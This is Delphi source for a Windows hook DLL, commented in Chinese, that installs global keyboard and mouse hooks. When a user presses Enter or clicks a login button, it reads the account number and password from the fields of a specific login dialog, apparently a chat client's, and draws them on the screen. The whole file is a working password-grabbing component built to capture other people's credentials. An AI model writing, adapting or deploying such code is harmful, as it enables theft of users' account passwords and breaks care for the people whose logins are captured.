library HookDLL;

uses Windows, Messages;

var KeyboardHook, MouseHook: HHOOK;

 // 尝试取密码
procedure GetPassWord();
var
  Dialog, ComboBox, Edit: HWND;
  Buffer: array[0..20] of Char;
  ScreenDC: HDC;
  TmpStr: string;
begin
 // 是否登录框
  Dialog := GetForegroundWindow();

  if FindWindowEx(Dialog, 0, 'Button', '注册向导') = 0 then Exit;

  GetClassName(Dialog, Buffer, 20);
  if (Buffer <> '#32770') then Exit;


 // 取控件句柄
  ComboBox := FindWindowEx(Dialog, 0, 'ComboBox', nil);
  if (ComboBox = 0) then Exit;

  Edit := FindWindowEx(Dialog, 0, 'Edit', nil);
  if (Edit = 0) then Exit;


 // 取控件文字
  Buffer[GetWindowText(ComboBox, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := '号码: ' + Buffer;

  Buffer[GetWindowText(Edit, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := TmpStr + '密码: ' + Buffer;

  
 // 输出到屏幕
  ScreenDC := GetDC(0);
  TextOut(ScreenDC, 0, 0, PChar(TmpStr), Length(TmpStr));
  ReleaseDC(0, ScreenDC);
end;

 // 键盘钩子函数
function KeyboardProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
begin
  if (nCode = HC_ACTION) and (wParam = 13) and (lParam and $80000000 = 0) then GetPassWord();
  Result := CallNextHookEx(KeyboardHook, nCode, wParam, lParam);
end;

 // 鼠标钩子函数
function MouseProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Buffer: array[0..10] of Char;
begin 
  if (nCode = HC_ACTION) and (wParam = WM_LBUTTONDOWN) then
  begin
    GetWindowText(PMouseHookStruct(lParam).hwnd, Buffer, 10);
    if (Copy(Buffer, 1, 2) = '登') then GetPassWord();
  end;
  Result := CallNextHookEx(MouseHook, nCode, wParam, lParam);
end;

 // 安装鼠标键盘钩子
procedure HookOn();
begin
  KeyboardHook := SetWindowsHookEx(WH_KEYBOARD, @KeyboardProc, HInstance, 0);
  MouseHook := SetWindowsHookEx(WH_MOUSE, @MouseProc, HInstance, 0);
end;

 // 卸载鼠标键盘钩子
procedure HookOff();
begin
  UnHookWindowsHookEx(KeyboardHook);
  UnHookWindowsHookEx(MouseHook);
end;

 // 导出函数
exports HookOn, HookOff;
  
begin
end.    
